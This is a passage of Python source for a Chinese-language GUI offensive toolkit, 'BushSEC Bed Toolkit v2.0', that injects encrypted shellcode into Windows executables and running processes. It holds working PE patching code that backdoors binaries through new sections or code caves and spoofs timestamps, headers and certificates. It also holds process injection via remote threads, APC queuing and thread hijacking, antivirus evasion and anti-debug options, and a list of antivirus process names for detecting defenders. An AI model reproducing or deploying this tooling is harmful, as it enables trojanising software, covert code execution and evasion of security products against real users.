            pe.__structures__.append(new_section)
            pe.sections.append(new_section)
            
            # 更新镜像大小
            new_image_size = align(
                new_section_VA + new_section_virtual_size,
                pe.OPTIONAL_HEADER.SectionAlignment
            )
            pe.OPTIONAL_HEADER.SizeOfImage = new_image_size
            
            # 设置新的入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section_VA
            
            # 更新代码大小 - 修复这里的属性名称
            if new_section.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']:
                pe.OPTIONAL_HEADER.SizeOfCode += new_section_raw_size
                # 同时更新初始化数据大小
                pe.OPTIONAL_HEADER.SizeOfInitializedData += new_section_raw_size
            
            # 更新区段对齐信息
            new_section.VirtualAddress = align(
                new_section.VirtualAddress,
                pe.OPTIONAL_HEADER.SectionAlignment
            )
            new_section.PointerToRawData = align(
                new_section.PointerToRawData,
                pe.OPTIONAL_HEADER.FileAlignment
            )
            
            # 确保新区段的特征值包含可执行权限
            new_section.Characteristics |= (
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE']
            )

        elif inject_method == 'code_cave':
            # 在现有节中查找代码洞注入
            cave_size_needed = len(decryption_stub) + len(encrypted_shellcode) + 5  # 5 bytes for jmp
            cave_rva = find_code_cave(pe, cave_size_needed)
            
            if not cave_rva:
                return False, "未找到足够大的代码洞用于注入"
                
            # 计算代码洞的文件偏移
            cave_offset = pe.get_offset_from_rva(cave_rva)
            
            # 组装shellcode
            preserve_entry = options.get('preserve_entry', True)
            if preserve_entry:
                jmp_back_location = cave_rva + len(decryption_stub) + len(encrypted_shellcode)
                jmp_back_code = create_jmp_code(original_entry, jmp_back_location)
                final_shellcode = decryption_stub + encrypted_shellcode + jmp_back_code
            else:
                final_shellcode = decryption_stub + encrypted_shellcode
                
            # 写入代码洞
            with open(output_file_path, 'r+b') as f:
                f.seek(cave_offset)
                f.write(final_shellcode)
                
            # 更新入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_rva
            
            # 在写入代码洞后更新节的大小
            for section in pe.sections:
                if section.VirtualAddress <= cave_rva < section.VirtualAddress + section.SizeOfRawData:
                    if section.Misc_VirtualSize < (cave_rva - section.VirtualAddress + len(final_shellcode)):
                        section.Misc_VirtualSize = cave_rva - section.VirtualAddress + len(final_shellcode)
                    break

        elif inject_method == 'existing_section':
            # 在现有节尾部附加代码
            # 选择一个合适的节(可执行的)
            target_section = None
            for section in pe.sections:
                if section.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
                    # 验证节有足够空间
                    if section.Misc_VirtualSize + len(decryption_stub) + len(encrypted_shellcode) + 5 <= section.SizeOfRawData:
                        target_section = section
                        break
            
            if not target_section:
                return False, "没有找到适合注入的现有节"
                
            # 计算注入位置
            injection_rva = target_section.VirtualAddress + target_section.Misc_VirtualSize
            injection_offset = pe.get_offset_from_rva(injection_rva)
            
            # 组装shellcode
            preserve_entry = options.get('preserve_entry', True)
            if preserve_entry:
                jmp_back_location = injection_rva + len(decryption_stub) + len(encrypted_shellcode)
                jmp_back_code = create_jmp_code(original_entry, jmp_back_location)
                final_shellcode = decryption_stub + encrypted_shellcode + jmp_back_code
            else:
                final_shellcode = decryption_stub + encrypted_shellcode
                
            # 写入代码
            with open(output_file_path, 'r+b') as f:
                f.seek(injection_offset)
                f.write(final_shellcode)
                
            # 更新节大小
            target_section.Misc_VirtualSize += len(final_shellcode)
            
            # 更新入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = injection_rva
            
            # 更新节的虚拟大小
            target_section.Misc_VirtualSize = align(
                target_section.Misc_VirtualSize,
                pe.OPTIONAL_HEADER.SectionAlignment
            )
        
        # 更新所有节的对齐
        for section in pe.sections:
            section.VirtualAddress = align(section.VirtualAddress, pe.OPTIONAL_HEADER.SectionAlignment)
            section.PointerToRawData = align(section.PointerToRawData, pe.OPTIONAL_HEADER.FileAlignment)
            section.SizeOfRawData = align(section.SizeOfRawData, pe.OPTIONAL_HEADER.FileAlignment)
            
        # 重新计算整个镜像的大小
        max_va = max(
            section.VirtualAddress + section.Misc_VirtualSize
            for section in pe.sections
        )
        pe.OPTIONAL_HEADER.SizeOfImage = align(max_va, pe.OPTIONAL_HEADER.SectionAlignment)
        
        # 应用额外的反检测技术
        if options.get('timestamp_manipulation', False):
            manipulate_timestamp(pe)
            
        if options.get('section_name_randomization', False):
            modify_section_names(pe, True)
            
        if options.get('pe_header_randomization', False):
            randomize_headers(pe)
            
        if options.get('add_certificate', False):
            add_fake_certificate(pe)
        
        # 清除校验和并重新计算
        pe.OPTIONAL_HEADER.CheckSum = 0
        pe.write(output_file_path)
        
        # 重新加载并设置校验和
        pe = pefile.PE(output_file_path)
        calculated_checksum = pe.generate_checksum()
        pe.OPTIONAL_HEADER.CheckSum = calculated_checksum
        pe.write(output_file_path)
        
        # 验证文件写入是否成功
        if not os.path.exists(output_file_path):
            return False, "输出文件写入失败"
            
        # 验证文件大小是否合理
        if os.path.getsize(output_file_path) == 0:
            return False, "输出文件大小为0"
        
        return True, "修补成功"
    except pefile.PEFormatError as e:
        return False, f"无效的 PE 文件: {str(e)}"
    except IOError as e:
        return False, f"读取文件出错: {str(e)}"
    except Exception as e:
        import traceback
        traceback.print_exc()
        return False, f"修补过程中出错: {str(e)}"

# 进程注入功能
def process_injection(pid, shellcode_file, injection_method='classic'):
    """改进的进程注入函数"""
    try:
        kernel32 = ctypes.windll.kernel32
        
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
            
        if not shellcode:
            return False, "Shellcode 文件为空"
            
        # 增加权限检查和提升
        def enable_privileges():
            priv_flags = (
                "SeDebugPrivilege",
                "SeLoadDriverPrivilege", 
                "SeTakeOwnershipPrivilege",
                "SeBackupPrivilege",
                "SeRestorePrivilege",
                "SeImpersonatePrivilege"
            )
            
            h_token = ctypes.c_void_p()
            if not kernel32.OpenProcessToken(
                kernel32.GetCurrentProcess(),
                0x0020 | 0x0008, # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
                ctypes.byref(h_token)
            ):
                return False
                
            for privilege in priv_flags:
                try:
                    # 提升指定权限
                    ctypes.windll.advapi32.LookupPrivilegeValueW(
                        None, privilege, ctypes.byref(ctypes.c_ulonglong())
                    )
                except:
                    continue
            return True
            
        if not enable_privileges():
            return False, "权限提升失败"
            
        # 改进进程打开逻辑
        h_process = kernel32.OpenProcess(
            PROCESS_ALL_ACCESS,
            False,
            pid
        )
        
        if not h_process:
            # 如果直接打开失败,尝试以较低权限打开
            h_process = kernel32.OpenProcess(
                0x0010 | 0x0020 | 0x0008, # PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
                False, 
                pid
            )
            if not h_process:
                return False, f"无法打开进程 {pid}"
                
        # 分配内存前进行权限校验
        mem_info = MEMORY_BASIC_INFORMATION()
        kernel32.VirtualQueryEx(
            h_process,
            0,
            ctypes.byref(mem_info),
            ctypes.sizeof(mem_info)
        )
        
        # 分配内存时使用合适的保护属性
        mem_addr = kernel32.VirtualAllocEx(
            h_process,
            0,
            len(shellcode),
            ALLOC_TYPES['MEM_COMMIT'] | ALLOC_TYPES['MEM_RESERVE'],
            0x40  # PAGE_EXECUTE_READWRITE
        )
        
        if not mem_addr:
            kernel32.CloseHandle(h_process)
            return False, "内存分配失败"
            
        # 写入shellcode
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(
            h_process,
            mem_addr,
            shellcode,
            len(shellcode),
            ctypes.byref(written)
        ) or written.value != len(shellcode):
            kernel32.VirtualFreeEx(h_process, mem_addr, 0, 0x8000)
            kernel32.CloseHandle(h_process)
            return False, "写入shellcode失败"
            
        if injection_method == 'classic':
            # 使用CreateRemoteThread注入
            thread_id = ctypes.c_ulong(0)
            if kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                mem_addr,
                None,
                0,
                ctypes.byref(thread_id)
            ):
                kernel32.CloseHandle(h_process)
                return True, "注入成功"
            else:
                kernel32.VirtualFreeEx(h_process, mem_addr, 0, 0x8000)
                kernel32.CloseHandle(h_process)
                return False, "创建远程线程失败"
                
        elif injection_method == 'apc':
            # 改进的APC注入
            thread_entry = THREADENTRY32()
            thread_entry.dwSize = ctypes.sizeof(thread_entry)
            h_snapshot = kernel32.CreateToolhelp32Snapshot(0x4, pid)
            
            success = False
            if h_snapshot != -1:
                if kernel32.Thread32First(h_snapshot, ctypes.byref(thread_entry)):
                    while True:
                        if thread_entry.th32OwnerProcessID == pid:
                            h_thread = kernel32.OpenThread(
                                0x0020,  # THREAD_SET_CONTEXT
                                False,
                                thread_entry.th32ThreadID
                            )
                            if h_thread:
                                if kernel32.QueueUserAPC(
                                    mem_addr,
                                    h_thread,
                                    0
                                ):
                                    success = True
                                kernel32.CloseHandle(h_thread)
                        
                        if not kernel32.Thread32Next(h_snapshot, ctypes.byref(thread_entry)):
                            break
                            
            kernel32.CloseHandle(h_snapshot)
            if success:
                kernel32.CloseHandle(h_process) 
                return True, "APC注入成功"
            else:
                kernel32.VirtualFreeEx(h_process, mem_addr, 0, 0x8000)
                kernel32.CloseHandle(h_process)
                return False, "APC注入失败"
                
        elif injection_method == 'thread_hijack':
            # 改进的线程劫持注入
            thread_entry = THREADENTRY32()
            thread_entry.dwSize = ctypes.sizeof(thread_entry)
            h_snapshot = kernel32.CreateToolhelp32Snapshot(0x4, pid)
            
            success = False
            if h_snapshot != -1:
                if kernel32.Thread32First(h_snapshot, ctypes.byref(thread_entry)):
                    while True:
                        if thread_entry.th32OwnerProcessID == pid:
                            h_thread = kernel32.OpenThread(
                                0x0020 | 0x0002,  # THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME
                                False,
                                thread_entry.th32ThreadID  
                            )
                            if h_thread:
                                if kernel32.SuspendThread(h_thread) != -1:
                                    ctx = CONTEXT()
                                    ctx.ContextFlags = 0x10007
                                    if kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
                                        # 保存原始RIP
                                        original_rip = ctx.Rip
                                        
                                        # 设置新的RIP指向shellcode
                                        ctx.Rip = mem_addr
                                        
                                        if kernel32.SetThreadContext(h_thread, ctypes.byref(ctx)):
                                            kernel32.ResumeThread(h_thread)
                                            success = True
                                            
                                kernel32.CloseHandle(h_thread)
                                if success:
                                    break
                                    
                        if not kernel32.Thread32Next(h_snapshot, ctypes.byref(thread_entry)):
                            break
                            
            kernel32.CloseHandle(h_snapshot)
            if success:
                kernel32.CloseHandle(h_process)
                return True, "线程劫持注入成功"
            else:
                kernel32.VirtualFreeEx(h_process, mem_addr, 0, 0x8000)  
                kernel32.CloseHandle(h_process)
                return False, "线程劫持注入失败"
                
        return False, "未知的注入方法"
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        return False, f"注入过程出错: {str(e)}"

# 创建更完善的UI类，支持高级操作
class AdvancedPEInjector(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
        icon_path = r'111.ico'
        if (os.path.exists(icon_path)):
            self.setWindowIcon(QIcon(icon_path))
        self.secondary_menu = None
        self.status_message = ""
        self.process_list = []

    def init_ui(self):
        self.setWindowTitle('BushSEC Bed Toolkit v2.0')
        self.setMinimumSize(1200, 800)
        self.showMaximized()

        # 设置暗黑风格
        self.setStyleSheet("""
            QWidget {
                background-color: #121212;
                color: #f0f0f0;
                border-radius: 4px;
                font-family: 'Segoe UI', Arial;
            }
            
            QTabWidget::pane {
                border: 1px solid #30343b;
                background: #1a1a1a;
            }
            
            QTabWidget::tab-bar {
                left: 5px;
            }
            
            QTabBar::tab {
                background: #1a1a1a;
                color: #cccccc;
                min-width: 150px;
                padding: 10px 15px;
                margin-right: 5px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            
            QTabBar::tab:selected {
                background: #30343b;
                color: #00ff00;
                border-bottom: 2px solid #00ff00;
            }
            
            QTabBar::tab:hover:!selected {
                background: #252525;
                color: #ffffff;
            }
            
            QLabel {
                color: #f0f0f0;
                padding: 5px;
            }
            
            QPushButton {
                background-color: #1a1a1a;
                color: #f0f0f0;
                border: 1px solid #30343b;
                padding: 8px 15px;
                border-radius: 4px;
            }
            
            QPushButton:hover {
                background-color: #2a2a2a;
                border: 1px solid #00cc00;
                color: #ffffff;
            }
            
            QPushButton:pressed {
                background-color: #00cc00;
                color: #000000;
            }
            
            QLineEdit, QComboBox, QSpinBox {
                background-color: #1a1a1a;
                color: #f0f0f0;
                border: 1px solid #30343b;
                padding: 8px;
                border-radius: 4px;
            }
            
            QLineEdit:focus, QComboBox:focus, QSpinBox:focus {
                border: 1px solid #00cc00;
            }
            
            QGroupBox {
                border: 1px solid #30343b;
                border-radius: 4px;
                margin-top: 20px;
                font-weight: bold;
            }
            
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 10px;
            }
            
            QCheckBox {
                spacing: 10px;
            }
            
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                border-radius: 3px;
                border: 1px solid #30343b;
                background: #1a1a1a;
            }
            
            QCheckBox::indicator:checked {
                background-color: #00cc00;
                border: 1px solid #00cc00;
            }
            
            QRadioButton {
                spacing: 10px;
            }
            
            QRadioButton::indicator {
                width: 18px;
                height: 18px;
                border-radius: 9px;
                border: 1px solid #30343b;
                background: #1a1a1a;
            }
            
            QRadioButton::indicator:checked {
                background-color: #00cc00;
                border: 1px solid #00cc00;
                width: 10px;
                height: 10px;
                border-radius: 6px;
            }
        """)

        # 主布局
        main_layout = QVBoxLayout()
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(15, 15, 15, 15)
        
        # 标题
        title_layout = QHBoxLayout()
        title_label = QLabel('BushSEC 被窝')
        title_label.setFont(QFont('Segoe UI', 18, QFont.Bold))
        title_label.setStyleSheet("""
            color: #00ff00;
            padding: 10px;
            border-bottom: 2px solid #00cc00;
        """)
        title_layout.addWidget(title_label)
        main_layout.addLayout(title_layout)
        
        # 选项卡
        tab_widget = QTabWidget()
        
        # 注入选项卡
        injection_tab = QWidget()
        tab_widget.addTab(injection_tab, "PE 文件注入")
        
        # 进程注入选项卡
        process_tab = QWidget()
        tab_widget.addTab(process_tab, "进程注入")
        
        # 免杀混淆选项卡
        obfuscation_tab = QWidget()
        tab_widget.addTab(obfuscation_tab, "免杀混淆")
        
        # 杀毒软件检测选项卡
        av_tab = QWidget()
        tab_widget.addTab(av_tab, "杀毒软件检测")
        
        # 工具集选项卡
        toolbox_tab = QWidget()
        tab_widget.addTab(toolbox_tab, "工具集")
        
        # 设置各选项卡内容
        self.setup_injection_tab(injection_tab)
        self.setup_process_tab(process_tab) 
        self.setup_obfuscation_tab(obfuscation_tab)
        self.setup_av_tab(av_tab)
        self.setup_toolbox_tab(toolbox_tab)
        
        main_layout.addWidget(tab_widget)
        
        # 状态栏
        status_layout = QHBoxLayout()
        self.status_label = QLabel("")
        self.status_label.setStyleSheet("""
            color: #00cc00;
            background-color: #1a1a1a;
            border-radius: 4px;
            padding: 8px;
        """)
        status_layout.addWidget(self.status_label)
        main_layout.addLayout(status_layout)
        
        self.setLayout(main_layout)

    def setup_injection_tab(self, tab):
        """设置PE文件注入选项卡"""
        layout = QVBoxLayout()
        layout.setSpacing(15)
        
        # 文件选择区域
        file_group = QGroupBox("文件选择")
        file_layout = QGridLayout()
        
        # PE文件选择
        file_layout.addWidget(QLabel("目标PE文件:"), 0, 0)
        self.pe_file_input = QLineEdit()
        file_layout.addWidget(self.pe_file_input, 0, 1)
        select_pe_button = QPushButton("浏览...")
        select_pe_button.clicked.connect(self.select_pe_file)
        file_layout.addWidget(select_pe_button, 0, 2)
        
        # Shellcode文件选择
        file_layout.addWidget(QLabel("Shellcode文件:"), 1, 0)
        self.shellcode_file_input = QLineEdit()
        file_layout.addWidget(self.shellcode_file_input, 1, 1)
        select_shellcode_button = QPushButton("浏览...")
        select_shellcode_button.clicked.connect(self.select_shellcode_file)
        file_layout.addWidget(select_shellcode_button, 1, 2)
        
        # 输出文件选择
        file_layout.addWidget(QLabel("输出文件:"), 2, 0)
        self.output_file_input = QLineEdit()
        file_layout.addWidget(self.output_file_input, 2, 1)
        select_output_button = QPushButton("浏览...")
        select_output_button.clicked.connect(self.select_output_file)
        file_layout.addWidget(select_output_button, 2, 2)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # 注入选项区域
        injection_group = QGroupBox("注入选项")
        injection_layout = QGridLayout()
        
        # 注入方法
        injection_layout.addWidget(QLabel("注入方法:"), 0, 0)
        self.injection_method_combo = QComboBox()
        self.injection_method_combo.addItems(["新增区段", "代码洞注入", "已有区段注入"])
        injection_layout.addWidget(self.injection_method_combo, 0, 1)
        
        # 加密方法
        injection_layout.addWidget(QLabel("加密方法:"), 1, 0)
        self.encryption_method_combo = QComboBox()
        self.encryption_method_combo.addItems(["XOR单字节", "XOR多字节", "RC4", "AES"])
        injection_layout.addWidget(self.encryption_method_combo, 1, 1)
        
        # 混淆级别
        injection_layout.addWidget(QLabel("混淆级别:"), 2, 0)
        self.obfuscation_level_combo = QComboBox()
        self.obfuscation_level_combo.addItems(["低", "中", "高", "极高"])
        injection_layout.addWidget(self.obfuscation_level_combo, 2, 1)
        
        # 保留原始入口点选项
        self.preserve_entry_checkbox = QCheckBox("保留原始入口点 (执行完返回原程序)")
        self.preserve_entry_checkbox.setChecked(True)
        injection_layout.addWidget(self.preserve_entry_checkbox, 3, 0, 1, 2)
        
        # 备份原始文件选项
        self.backup_file_checkbox = QCheckBox("备份原始文件")
        self.backup_file_checkbox.setChecked(True)
        injection_layout.addWidget(self.backup_file_checkbox, 4, 0, 1, 2)
        
        injection_group.setLayout(injection_layout)
        layout.addWidget(injection_group)
        
        # 免杀选项
        evasion_group = QGroupBox("增强选项")
        evasion_layout = QGridLayout()
        
        # 反调试
        self.anti_debug_checkbox = QCheckBox("加入反调试代码")
        self.anti_debug_checkbox.setChecked(False)
        evasion_layout.addWidget(self.anti_debug_checkbox, 0, 0)
        
        # 睡眠检测
        self.sleep_check_checkbox = QCheckBox("睡眠沙箱检测")
        self.sleep_check_checkbox.setChecked(False)
        evasion_layout.addWidget(self.sleep_check_checkbox, 0, 1)
        
        # 时间戳操纵
        self.timestamp_checkbox = QCheckBox("时间戳操纵")
        self.timestamp_checkbox.setChecked(True)
        evasion_layout.addWidget(self.timestamp_checkbox, 1, 0)
        
        # 区段名称随机化
        self.section_name_checkbox = QCheckBox("区段名称随机化")
        self.section_name_checkbox.setChecked(True)
        evasion_layout.addWidget(self.section_name_checkbox, 1, 1)
        
        # PE头随机化
        self.pe_header_checkbox = QCheckBox("PE头随机化")
        self.pe_header_checkbox.setChecked(True)
        evasion_layout.addWidget(self.pe_header_checkbox, 2, 0)
        
        # 添加虚假证书
        self.cert_checkbox = QCheckBox("添加虚假证书数据")
        self.cert_checkbox.setChecked(False)
        evasion_layout.addWidget(self.cert_checkbox, 2, 1)
        
        # 垃圾数据填充
        self.junk_data_checkbox = QCheckBox("添加垃圾指令")
        self.junk_data_checkbox.setChecked(True)
        evasion_layout.addWidget(self.junk_data_checkbox, 3, 0)
        
        # 间接跳转
        self.indirect_jump_checkbox = QCheckBox("使用间接跳转")
        self.indirect_jump_checkbox.setChecked(False)
        evasion_layout.addWidget(self.indirect_jump_checkbox, 3, 1)
        
        evasion_group.setLayout(evasion_layout)
        layout.addWidget(evasion_group)
        
        # 执行按钮
        execute_layout = QHBoxLayout()
        self.patch_button = QPushButton("执行注入")
        self.patch_button.setStyleSheet("""
            QPushButton {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #00cc00;
                padding: 12px 25px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc00;
                color: #000000;
            }
            QPushButton:pressed {
                background-color: #009900;
            }
        """)
        self.patch_button.clicked.connect(self.patch_pe_file)
        execute_layout.addWidget(self.patch_button)
        layout.addLayout(execute_layout)
        
        tab.setLayout(layout)

    def setup_process_tab(self, tab):
        """设置进程注入选项卡"""
        layout = QVBoxLayout()
        layout.setSpacing(15)
        
        # Shellcode选择区域
        file_group = QGroupBox("Shellcode文件选择")
        file_layout = QHBoxLayout()
        
        file_layout.addWidget(QLabel("Shellcode文件:"))
        self.process_shellcode_input = QLineEdit()
        file_layout.addWidget(self.process_shellcode_input)
        
        select_process_shellcode_button = QPushButton("浏览...")
        select_process_shellcode_button.clicked.connect(self.select_process_shellcode_file)
        file_layout.addWidget(select_process_shellcode_button)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # 进程选择区域
        process_group = QGroupBox("目标进程选择")
        process_layout = QVBoxLayout()
        
        process_input_layout = QHBoxLayout()
        process_input_layout.addWidget(QLabel("进程ID (PID):"))
        self.pid_input = QLineEdit()
        self.pid_input.setPlaceholderText("输入目标进程ID")
        process_input_layout.addWidget(self.pid_input)
        
        refresh_button = QPushButton("刷新进程列表")
        refresh_button.clicked.connect(self.refresh_process_list)
        process_input_layout.addWidget(refresh_button)
        
        process_layout.addLayout(process_input_layout)
        
        # 进程列表
        self.process_list_widget = QListWidget()
        self.process_list_widget.setStyleSheet("""
            QListWidget {
                background-color: #1a1a1a;
                alternate-background-color: #252525;
                color: #f0f0f0;
                border: 1px solid #30343b;
            }
            QListWidget::item {
                padding: 5px;
            }
            QListWidget::item:selected {
                background-color: #00cc00;
                color: #000000;
            }
            QListWidget::item:hover {
                background-color: #2a2a2a;
            }
        """)
        self.process_list_widget.itemClicked.connect(self.on_process_selected)
        process_layout.addWidget(self.process_list_widget)
        
        process_group.setLayout(process_layout)
        layout.addWidget(process_group)
        
        # 注入选项区域
        injection_options_group = QGroupBox("进程注入选项")
        injection_options_layout = QGridLayout()
        
        # 注入方法
        injection_options_layout.addWidget(QLabel("注入方法:"), 0, 0)
        self.process_injection_method_combo = QComboBox()
        self.process_injection_method_combo.addItems(["经典创建远程线程", "APC注入", "线程劫持", "PE加载"])
        injection_options_layout.addWidget(self.process_injection_method_combo, 0, 1)
        
        # 加密选项
        self.process_encrypt_checkbox = QCheckBox("加密Shellcode")
        self.process_encrypt_checkbox.setChecked(True)
        injection_options_layout.addWidget(self.process_encrypt_checkbox, 1, 0)
        
        # 内存保护
        self.memory_protect_checkbox = QCheckBox("执行后修改内存保护")
        self.memory_protect_checkbox.setChecked(True)
        injection_options_layout.addWidget(self.memory_protect_checkbox, 1, 1)
        
        injection_options_group.setLayout(injection_options_layout)
        layout.addWidget(injection_options_group)
        
        # 执行按钮
        execute_layout = QHBoxLayout()
        self.inject_process_button = QPushButton("执行进程注入")
        self.inject_process_button.setStyleSheet("""
            QPushButton {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #00cc00;
                padding: 12px 25px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc00;
                color: #000000;
            }
            QPushButton:pressed {
                background-color: #009900;
            }
        """)
        self.inject_process_button.clicked.connect(self.inject_to_process)
        execute_layout.addWidget(self.inject_process_button)
        layout.addLayout(execute_layout)
        
        tab.setLayout(layout)

    def setup_obfuscation_tab(self, tab):
        """设置免杀混淆选项卡"""
        layout = QVBoxLayout()
        layout.setSpacing(15)
        
        # 文件选择区域
        file_group = QGroupBox("文件选择")
        file_layout = QGridLayout()
        
        # 输入文件选择
        file_layout.addWidget(QLabel("输入文件:"), 0, 0)
        self.obfuscate_input_file = QLineEdit()
        file_layout.addWidget(self.obfuscate_input_file, 0, 1)
        select_obfuscate_input_button = QPushButton("浏览...")
        select_obfuscate_input_button.clicked.connect(self.select_obfuscate_input_file)
        file_layout.addWidget(select_obfuscate_input_button, 0, 2)
        
        # 输出文件选择
        file_layout.addWidget(QLabel("输出文件:"), 1, 0)
        self.obfuscate_output_file = QLineEdit()
        file_layout.addWidget(self.obfuscate_output_file, 1, 1)
        select_obfuscate_output_button = QPushButton("浏览...")
        select_obfuscate_output_button.clicked.connect(self.select_obfuscate_output_file)
        file_layout.addWidget(select_obfuscate_output_button, 1, 2)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # 混淆选项区域
        obfuscation_group = QGroupBox("混淆选项")
        obfuscation_layout = QGridLayout()
        
        # 文件类型
        obfuscation_layout.addWidget(QLabel("文件类型:"), 0, 0)
        self.file_type_combo = QComboBox()
        self.file_type_combo.addItems(["可执行文件 (EXE)", "动态链接库 (DLL)", "Shellcode"])
        obfuscation_layout.addWidget(self.file_type_combo, 0, 1)
        
        # 混淆方法
        obfuscation_layout.addWidget(QLabel("混淆方法:"), 1, 0)
        self.obfuscation_method_combo = QComboBox()
        self.obfuscation_method_combo.addItems(["代码混淆", "加密壳", "多态变形", "虚拟化保护"])
        obfuscation_layout.addWidget(self.obfuscation_method_combo, 1, 1)
        
        # 混淆强度
        obfuscation_layout.addWidget(QLabel("混淆强度:"), 2, 0)
        self.obfuscation_strength_combo = QComboBox()
        self.obfuscation_strength_combo.addItems(["低", "中", "高", "极高"])
        obfuscation_layout.addWidget(self.obfuscation_strength_combo, 2, 1)
        
        # 高级选项
        self.string_encryption_checkbox = QCheckBox("字符串加密")
        self.string_encryption_checkbox.setChecked(True)
        obfuscation_layout.addWidget(self.string_encryption_checkbox, 3, 0)
        
        self.api_obfuscation_checkbox = QCheckBox("API调用混淆")
        self.api_obfuscation_checkbox.setChecked(True)
        obfuscation_layout.addWidget(self.api_obfuscation_checkbox, 3, 1)
        
        self.control_flow_checkbox = QCheckBox("控制流混淆")
        self.control_flow_checkbox.setChecked(True)
        obfuscation_layout.addWidget(self.control_flow_checkbox, 4, 0)
        
        self.antidebug_obfuscation_checkbox = QCheckBox("反调试技术")
        self.antidebug_obfuscation_checkbox.setChecked(True)
        obfuscation_layout.addWidget(self.antidebug_obfuscation_checkbox, 4, 1)
        
        obfuscation_group.setLayout(obfuscation_layout)
        layout.addWidget(obfuscation_group)
        
        # 执行按钮
        execute_layout = QHBoxLayout()
        self.obfuscate_button = QPushButton("执行混淆")
        self.obfuscate_button.setStyleSheet("""
            QPushButton {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #00cc00;
                padding: 12px 25px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc00;
                color: #000000;
            }
            QPushButton:pressed {
                background-color: #009900;
            }
        """)
        self.obfuscate_button.clicked.connect(self.perform_obfuscation)
        execute_layout.addWidget(self.obfuscate_button)
        layout.addLayout(execute_layout)
        
        tab.setLayout(layout)

    def setup_av_tab(self, tab):
        """设置杀毒软件检测选项卡"""
        layout = QHBoxLayout()  # 改为水平布局
        
        # 左边部分
        left_widget = QWidget()
        left_layout = QVBoxLayout()
        left_layout.setSpacing(15)
        
        # 杀毒软件检测结果显示区域
        self.av_result_text = QTextEdit()
        self.av_result_text.setReadOnly(True) 
        self.av_result_text.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #30343b;
                font-family: 'Consolas', monospace;
            }
        """)
        left_layout.addWidget(self.av_result_text)
        
        # 刷新按钮
        refresh_av_button = QPushButton("检测杀毒软件")
        refresh_av_button.clicked.connect(self.refresh_av_list)
        left_layout.addWidget(refresh_av_button)
        
        left_widget.setLayout(left_layout)
        layout.addWidget(left_widget)
        
        # 右边部分
        right_widget = QWidget()
        right_layout = QVBoxLayout()
        
        # 右上文本框
        self.tasklist_input = QTextEdit()
        self.tasklist_input.setPlaceholderText("请输入tasklist/SVC命令输出结果...")
        self.tasklist_input.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #30343b;
                font-family: 'Consolas', monospace;
                min-height: 200px;
            }
        """)
        right_layout.addWidget(self.tasklist_input)
        
        # 分析按钮
        analyze_button = QPushButton("分析服务信息")
        analyze_button.clicked.connect(self.analyze_tasklist)
        analyze_button.setStyleSheet("""
            QPushButton {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #00cc00;
                padding: 8px 15px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00cc00;
                color: #000000;
            }
        """)
        right_layout.addWidget(analyze_button)
        
        # 右下文本框（结果显示）
        self.tasklist_result = QTextEdit()
        self.tasklist_result.setReadOnly(True)
        self.tasklist_result.setPlaceholderText("分析结果将在这里显示...")
        self.tasklist_result.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #30343b;
                font-family: 'Consolas', monospace;
                min-height: 200px;
            }
        """)
        right_layout.addWidget(self.tasklist_result)
        
        right_widget.setLayout(right_layout)
        layout.addWidget(right_widget)
        
        # 左右比例为1:1
        layout.setStretch(0, 1)
        layout.setStretch(1, 1)
        
        tab.setLayout(layout)

    def analyze_tasklist(self):
        """分析tasklist/SVC命令的输出结果"""
        input_text = self.tasklist_input.toPlainText().strip()
        if not input_text:
            self.tasklist_result.setText("请输入tasklist/SVC命令的输出结果")
            return
            
        # 杀毒软件服务特征
        av_service_signatures = {
    'ALYac': ['aylaunch.exe', 'ayupdate2.exe', 'AYRTSrv.exe', 'AYAgent.exe'],
    'AVG': ['AVGSvc.exe', 'AVGUI.exe', 'avgwdsvc.exe', 'avg.exe', 'avgaurd.exe', 'avgemc.exe', 'avgrsx.exe', 'avgserv.exe', 'avgw.exe'],
    'Acronis': ['arsm.exe', 'acronis_license_service.exe'],
    'Ad-Aware': ['AdAwareService.exe', 'Ad-Aware.exe', 'AdAware.exe'],
    'AhnLab-V3': ['patray.exe', 'V3Svc.exe'],
